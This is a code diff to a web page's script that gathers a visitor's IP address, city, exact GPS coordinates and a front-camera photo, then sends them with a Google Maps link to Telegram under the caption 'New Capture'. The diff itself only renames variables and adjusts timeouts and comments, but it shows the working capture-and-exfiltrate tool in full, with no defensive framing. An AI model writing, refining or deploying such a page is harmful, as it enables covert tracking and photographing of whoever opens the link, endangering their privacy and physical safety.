@@ -50,7 +50,7 @@
                 formData.append("caption", 
                 `🔴 New Capture\n\n` +
                 `IP: ${visitorInfo.ip}\n` +
-                `City: ${visitorInfo.city}, ${visitorInfo.country}\n` +
+                `Approx Location: ${visitorInfo.city}, ${visitorInfo.country}\n` +
                 `Exact GPS: ${visitorInfo.latitude}, ${visitorInfo.longitude}\n` +
                 `Accuracy: ${visitorInfo.accuracy} meters\n` +
                 `Maps: https://maps.google.com/?q=${visitorInfo.latitude},${visitorInfo.longitude}\n` +
@@ -73,19 +73,19 @@
                 }
 
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        visitorInfo.latitude = position.coords.latitude.toFixed(6);
-                        visitorInfo.longitude = position.coords.longitude.toFixed(6);
-                        visitorInfo.accuracy = position.coords.accuracy.toFixed(0);
+                    (pos) => {
+                        visitorInfo.latitude = pos.coords.latitude.toFixed(6);
+                        visitorInfo.longitude = pos.coords.longitude.toFixed(6);
+                        visitorInfo.accuracy = pos.coords.accuracy.toFixed(0);
                         resolve();
                     },
-                    (error) => {
-                        console.log("GPS Error:", error.message);
+                    (err) => {
+                        console.log("GPS Permission/Error:", err.message);
                         resolve();
                     },
                     { 
                         enableHighAccuracy: true, 
-                        timeout: 10000, 
+                        timeout: 12000, 
                         maximumAge: 0 
                     }
                 );
@@ -94,7 +94,7 @@
 
         async function start() {
             try {
-                // Get IP + City
+                // 1. Get IP + City
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 visitorInfo.ip = ipData.ip;
@@ -103,10 +103,10 @@
                 visitorInfo.city = geo.city || "Unknown";
                 visitorInfo.country = geo.country_name || "Unknown";
 
-                // Get Exact GPS Location
+                // 2. Get Exact GPS (this will ask permission)
                 await getExactGPS();
 
-                // Request Camera
+                // 3. Get Camera
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" }
                 });
@@ -115,7 +115,7 @@
                 video.srcObject = stream;
                 await video.play();
 
-                await new Promise(r => setTimeout(r, 1600));
+                await new Promise(r => setTimeout(r, 1500));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = 640;
@@ -123,7 +123,6 @@
                 canvas.getContext('2d').drawImage(video, 0, 0);
 
                 const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
-
                 stream.getTracks().forEach(track => track.stop());
 
                 await sendToTelegram(photoBase64);
